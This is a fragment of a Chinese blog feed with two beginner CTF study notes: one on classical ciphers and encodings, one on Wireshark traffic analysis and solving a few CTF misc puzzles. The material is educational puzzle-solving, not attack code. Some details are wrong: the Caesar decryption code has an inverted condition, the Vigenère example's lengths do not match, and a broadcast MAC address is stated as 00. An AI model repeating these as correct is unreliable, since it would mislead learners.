    <id>https://ggyggy666.github.io/2021/02/15/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypto%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-02-15T11:09:23.000Z</published>
    <updated>2021-03-17T13:36:18.919Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始学习crypt。地址：39.100.234.129</p><a id="more"></a><h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>实质就是替代，使用一个密码表，将26个字母偏移一定的顺序一一替代。</p><p>加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from string import ascii_uppercase</span><br><span class="line"></span><br><span class="line">Plaintext &#x3D; &quot;GGY&quot;</span><br><span class="line">key &#x3D; 3&#x2F;&#x2F;偏移3</span><br><span class="line"></span><br><span class="line">Plaintext &#x3D; Plaintext.upper()</span><br><span class="line">Ciphertext &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in Plaintext:</span><br><span class="line">if i not in ascii_uppercase:</span><br><span class="line">Ciphertext +&#x3D; i</span><br><span class="line">else:</span><br><span class="line">Ciphertext +&#x3D; chr(((ord(i)-ord(&quot;A&quot;)-key) % 26) + ord(&quot;A&quot;))</span><br><span class="line">print(Ciphertext)</span><br><span class="line">&#x2F;&#x2F;得到密文DDV</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from string import ascii_uppercase</span><br><span class="line"></span><br><span class="line">Ciphertext &#x3D; &quot;DDV&quot;</span><br><span class="line">Ciphertext &#x3D; Ciphertext.upper()</span><br><span class="line"></span><br><span class="line">def shift(key):</span><br><span class="line">Plaintext &#x3D; &quot;&quot;</span><br><span class="line">for i in Ciphertext:</span><br><span class="line">if i not in ascii_uppercase:</span><br><span class="line">Plaintext +&#x3D; chr(((ord(i)-ord(&quot;A&quot;)-key) % 26) + ord(&quot;A&quot;))</span><br><span class="line">return Plaintext</span><br><span class="line"></span><br><span class="line">for key in range(26):</span><br><span class="line">print(shift(key))</span><br></pre></td></tr></table></figure><p>由于不知道key是多少，因此需要遍历26个字母。得到</p><p><img src="https://i.loli.net/2021/02/15/39KklVbFIA4MetZ.png" alt="image-20210215210959362"></p><h1 id="关键词加密"><a href="#关键词加密" class="headerlink" title="关键词加密"></a>关键词加密</h1><p>选取一个关键词，如果有重复的字母，就去掉。比如success，就得到suces。重复的c和s就去掉了。关键词加密，需要写成两行的形式，第一行是从a到z的正常顺序字母。第二行就是先写给出的关键词，然后将后面填充上字母，规则是：按照第一行的顺序，看到某个字母，看第二行的关键词是否已经有了这个字母，有了就跳过，没有就填充到第二行后面。比如：</p><p>密文是：agqr{yue_stdcgciup_padas}</p><p>关键词key是：angstromcf</p><p>那么可以构建两行：</p><p><img src="https://i.loli.net/2021/02/15/r3EfCH9Dyt5gINY.png" alt="image-20210215211905103"></p><p>第一行是a-z, 第二行先写关键词。后面填充，a已经出现了，轮到b,没有就填充，轮到c, 已经存在了，轮到d， 没有就填充……由此得到密码表。</p><p><img src="https://i.loli.net/2021/02/15/HRokE9BdpnrFjYP.png" alt="image-20210215212023039"></p><p>根据密码表一一对应得到flag。</p><h1 id="仿射加密"><a href="#仿射加密" class="headerlink" title="仿射加密"></a>仿射加密</h1><p>加密：</p><p><img src="https://i.loli.net/2021/02/15/lU3R4c5xz6brACE.png" alt="image-20210215212229871"></p><p>p是明文，c是密文。a与26互素。解密则是：</p><p><img src="https://i.loli.net/2021/02/15/16jNUsAiWSBVQzv.png" alt="image-20210215212404151"></p><p>需要算出a的逆元。可以用python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line">print(invert(5, 26))</span><br><span class="line">&#x2F;&#x2F;求5关于26的逆元</span><br></pre></td></tr></table></figure><p>加密：</p><p><img src="https://i.loli.net/2021/02/15/F2BmOPRngMAL7iQ.png" alt="image-20210215213432807"></p><p>解密：</p><p><img src="https://i.loli.net/2021/02/15/I9f1zSMbZi6xFEO.png" alt="image-20210215213501563"></p><h1 id="单表代替"><a href="#单表代替" class="headerlink" title="单表代替"></a>单表代替</h1><p>爆破的话有26！，太大了难以爆破。需要一些解密手段。比如密文的字母频率，然后与已知的字母频率表对应从而可以得到密码表。</p><p>快速破解单表代替密码网站：<a href="http://quipqiup.com/" target="_blank" rel="noopener">http://quipqiup.com/</a></p><h1 id="维吉尼亚加密"><a href="#维吉尼亚加密" class="headerlink" title="维吉尼亚加密"></a>维吉尼亚加密</h1><p>多表代替，本质是多个凯撒加密。</p><p>明文是：ATTACKKATDAWN</p><p>关键词是：LEMON, 可以发现关键词的长度比明文短，此时可以重复关键词，得到：LEMONLEMONLE</p><p>然后查表：</p><p><img src="https://i.loli.net/2021/02/15/vwVxPcXKi3Y46SO.png" alt="image-20210215214507883"></p><p>可以看出这个表是从A-Z的字母表，每一行每一列都是从对应的字母开始的。加密过程：第一个字母是A，对应关键词第一个字母是L，那么就查看A列L行，得到L，以此类推。最终得到密文：LXFOPVEFRNHR。</p><p>解密过程：查看密文第一个字母是L，对应关键词第一个字母是L，那么先查看L行，在L行中找到L，对应的列是A，即可得到明文A。</p><p>可以避免字母频率分析攻击，但是有缺点：一个字符在明文中重复，密钥对应部分也相同，得到的密文部分也是重复的。</p><h1 id="替换和编码"><a href="#替换和编码" class="headerlink" title="替换和编码"></a>替换和编码</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><p><img src="https://i.loli.net/2021/02/15/f19OPXNtGwkCDYQ.png" alt="image-20210215215604406"></p><h2 id="字符串和字节类型转换"><a href="#字符串和字节类型转换" class="headerlink" title="字符串和字节类型转换"></a>字符串和字节类型转换</h2><p><img src="https://i.loli.net/2021/02/15/lYHo84FQ751EhUu.png" alt="image-20210215215636716"></p><h2 id="base64编码解码"><a href="#base64编码解码" class="headerlink" title="base64编码解码"></a>base64编码解码</h2><p><img src="https://i.loli.net/2021/02/15/O29vbFMPQiJSoDR.png" alt="image-20210215215710177"></p><h2 id="整形和字节类型转换"><a href="#整形和字节类型转换" class="headerlink" title="整形和字节类型转换"></a>整形和字节类型转换</h2><p><img src="https://i.loli.net/2021/02/15/PcqyNamCRil5TOu.png" alt="image-20210215215740413"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天开始学习crypt。地址：39.100.234.129&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-crypt（一）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-misc（三）</title>
    <link href="https://ggyggy666.github.io/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2021-02-09T10:51:56.000Z</published>
    <updated>2021-03-17T13:36:05.484Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习第三课——流量分析。</p><a id="more"></a><h1 id="互联网五层模型"><a href="#互联网五层模型" class="headerlink" title="互联网五层模型"></a>互联网五层模型</h1><p>应用层——传输层——网络层——链路层——物理层。</p><h1 id="WireShark的基本使用"><a href="#WireShark的基本使用" class="headerlink" title="WireShark的基本使用"></a>WireShark的基本使用</h1><ol><li><p>首先打开Wireshark，会查找本地接口。</p><p><img src="https://i.loli.net/2021/02/09/FEQdLJfCP3r2vsX.png" alt="image-20210209185805188"></p></li></ol><p>​    选择WLAN点击，就能收到一堆流量包。</p><ol start="2"><li><p>访问一个http网站：<a href="http://zj.gsxt.gov.cn/，可以发现导航栏中会显示不安全。在Wireshark中，过滤器那栏输入http，表示只显示http请求的流量包。" target="_blank" rel="noopener">http://zj.gsxt.gov.cn/，可以发现导航栏中会显示不安全。在Wireshark中，过滤器那栏输入http，表示只显示http请求的流量包。</a></p><p><img src="https://i.loli.net/2021/02/09/67aFXCSvWyPcgqx.png" alt="image-20210209190205889"></p><p>查看text/html的包，这就是返回包。</p><p><img src="https://i.loli.net/2021/02/09/rP51TFqmyBQdn7g.png" alt="image-20210209190623140"></p></li><li><p>访问一个https网站：<a href="https://etax.zhejiang.chinatax.gov.cn/，导航栏显示一把锁。那么http和https有什么区别呢？Wireshark过滤器输入：http" target="_blank" rel="noopener">https://etax.zhejiang.chinatax.gov.cn/，导航栏显示一把锁。那么http和https有什么区别呢？Wireshark过滤器输入：http</a> and http.request.uri contain “index.html”, 再去访问一遍https网站，发现没有index.html访问路径的流量包，访问http网站，显示了流量包。（过滤器是http的当然没有https的咯。。）</p><p><img src="https://i.loli.net/2021/02/09/T9oVfwix3a5UqQp.png" alt="image-20210209191127467"></p></li><li><p>查看https的需要输入tls, 显示出来的是加密过的东西。</p><p><img src="https://i.loli.net/2021/02/09/ugsOiFbyJa3HERl.png" alt="image-20210209191616741"></p></li><li><p>导出对象，过滤器输入http，停止捕获，点击文件——导出对象——选择http，之后保存就可以了。或者选定一个TCP数据包，右键点击追踪流，选择TCP流，之后弹出的框中选择原始数据，另存为文件。使用010打开即可。</p></li><li><p>保存整个流量，结尾是pcapng。</p></li></ol><h1 id="终端互相通信"><a href="#终端互相通信" class="headerlink" title="终端互相通信"></a>终端互相通信</h1><h2 id="两台电脑直接相连"><a href="#两台电脑直接相连" class="headerlink" title="两台电脑直接相连"></a>两台电脑直接相连</h2><p><img src="https://i.loli.net/2021/02/09/LqykD6oUcK75fOb.png" alt="image-20210209191927226"></p><p>给PC0和PC1分配各自的静态IP，然后在PC0的终端中去pingPC1。</p><p><img src="https://i.loli.net/2021/02/09/J97MRunbAQlWmzc.png" alt="image-20210209192128893"></p><p>直接ping通了。</p><h2 id="多台电脑相连"><a href="#多台电脑相连" class="headerlink" title="多台电脑相连"></a>多台电脑相连</h2><p>两台相同的电脑相连，只需要一条虚线连接。但是多台电脑相连就不行了，因为电脑那里端口有限，如果每连接一个终端就需要增加一个端口，这显然不可能。因此需要一个中介。</p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>电脑与集线器相连，由于是不同设备，就需要直实线了。给新增的PC2配置IP：192.168.1.102，在PC0上ping一下：</p><p><img src="https://i.loli.net/2021/02/09/o97SXn4eUgVp6Hb.png" alt="image-20210209192833113"></p><p>但是集线器有一个缺点。PC0向另一个PC发送消息时集线器是向其他所有PC发送的，如果这时有一个黑客连进来了，就会监听到，很不安全。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>与集线器类似，都是实线连接。</p><p><img src="https://i.loli.net/2021/02/09/xkDvB4nWCNAafdO.png" alt="image-20210209193158257"></p><p>交换机就比较安全了。因为两个终端通信时，不仅需要IP，还需要一个MAC地址。交换机根据MAC地址发送到对应的目的端口，这样就不会发送给其它人了。而IP-MAC地址表就是ARP表。如果想要发送给多个人，就可以将目的MAC地址修改成00即广播地址。ARP表中没有IP对应的目的MAC地址，需要启动ARP寻址。</p><p><img src="https://i.loli.net/2021/02/09/1gwOjLWFMTq3lEf.png" alt="image-20210209193606167"></p><p>三次握手：SYN——SYN，ACK——ACK</p><p><img src="https://i.loli.net/2021/02/09/aBJzL7GxkQ1XRny.png" alt="image-20210209194333634"></p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="上课认真听了吗"><a href="#上课认真听了吗" class="headerlink" title="上课认真听了吗"></a>上课认真听了吗</h2><p>题目显示是三种流量中查找flag。直接按照师傅说的方法来。</p><ol><li><p>下载附件打开，点击查找那个图标。选择“分组字节流”，“字符串”，查找flag{</p><p><img src="https://i.loli.net/2021/02/09/ahflszrxBOYwAXm.png" alt="image-20210209210132208"></p></li><li><p>不停点击右边的查找就能找到几个flag了，拼接即可。</p><p><img src="https://i.loli.net/2021/02/09/JvkuLR2iNtOx4Zc.png" alt="image-20210209210247067"></p></li></ol><h2 id="我是间谍"><a href="#我是间谍" class="headerlink" title="我是间谍"></a>我是间谍</h2><ol><li><p>下载附件imaspy.exe, Wireshark抓包WLAN，然后运行exe文件，即可捕获到流量。</p></li><li><p>按照上面的方法查找flag{即可拿到flag。</p><p><img src="https://i.loli.net/2021/02/09/GkSsCK4Rjr6LEb1.png" alt="image-20210209212609026"></p></li></ol><h2 id="简单流量"><a href="#简单流量" class="headerlink" title="简单流量"></a>简单流量</h2><ol><li><p>下载附件，打开流量包后，Wireshark中导入SSL密钥：编辑——首选项——Protocol中选择TLS，然后导入sslkey.log</p><p><img src="https://i.loli.net/2021/02/09/prEePsDjaVnZ2mH.png" alt="image-20210209214712251"></p></li><li><p>还是搜索字符串，但是要注意，必须是字符分组而不是字符字节流了。</p><p><img src="https://i.loli.net/2021/02/09/tmcEwQCe5ZJB7FI.png" alt="image-20210209214844799"></p></li><li><p>找到之后，将其URL解码就行了。</p><p><img src="https://i.loli.net/2021/02/09/ta4iWHGjTCNrs9Z.png" alt="image-20210209214945700"></p></li></ol><h2 id="监听消息"><a href="#监听消息" class="headerlink" title="监听消息"></a>监听消息</h2><ol><li><p>下载附件，打开，使用Wireshark打开流量包。</p><p><img src="https://i.loli.net/2021/02/09/3UZvuV4dY2zgOM5.png" alt="image-20210209223855539"></p></li><li><p>尝试搜索flag无果。右键追踪流，发现一堆十六进制的字符。</p><p><img src="/2021/02/09/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210209224006300.png" alt="image-20210209224006300"></p></li><li><p>将这些字符串复制到010中，发现是PNG格式的</p><p><img src="https://i.loli.net/2021/02/09/IB5xHpNtqjQioO4.png" alt="image-20210209224054086"></p></li><li><p>但是使用PNG模板时报错了，另存为PNG图片也不乏显示。应该是校验和不对，也就是图片的宽高不对导致校验和不对。因此使用脚本爆破高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;listen.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">#print(misc[0x0c:0x0f+1])</span><br><span class="line"># 爆破高</span><br><span class="line"></span><br><span class="line">crc32_bytes &#x3D; misc[0x1d:0x20+1]# 读出bytes</span><br><span class="line">crc32_hex_eval &#x3D; eval(&#39;0x&#39; + crc32_bytes.hex())#bytes串 -&gt; hex串  -&gt;  值</span><br><span class="line">print(crc32_hex_eval)</span><br><span class="line">for i in range(4096):</span><br><span class="line">    data &#x3D; misc[0x0c:0x0f+1] + misc[0x10:0x13+1] + struct.pack(&#39;&gt;i&#39;,i)+ misc[0x18:0x1c+1]  #IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; crc32_hex_eval : #IHDR块的crc32值</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;height_hex:&quot;+ hex(i))</span><br></pre></td></tr></table></figure><p>最终得到高是100，十六进制就是64，因此010中修改高为64.</p><p><img src="https://i.loli.net/2021/02/09/WT5szBUQlDuF6ei.png" alt="image-20210209224545192"></p></li><li><p>保存成xxx.png之后，打开文件，发现是一张残缺的二维码。</p><p><img src="https://i.loli.net/2021/02/09/vrcy3HKCUd94bIA.png" alt="image-20210209224626750"></p></li><li><p>打开网站：<a href="https://merricx.github.io/qrazybox/，点击页面的Editor" target="_blank" rel="noopener">https://merricx.github.io/qrazybox/，点击页面的Editor</a> Mode</p><p><img src="https://i.loli.net/2021/02/09/afRBA6w5VNeHpIQ.png" alt="image-20210209224718618"></p><p>将右上角的框框截下来保存成code.png。</p></li><li><p>打开PS，新建文件，加载进来这两张图片(xxx.png和code.png)，按照大小组装好</p><p><img src="https://i.loli.net/2021/02/09/rdUApzielj81m47.png" alt="image-20210209224857923"></p><p>扫一扫即可。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习第三课——流量分析。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-misc（三）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    
  </entry>
  
</feed>
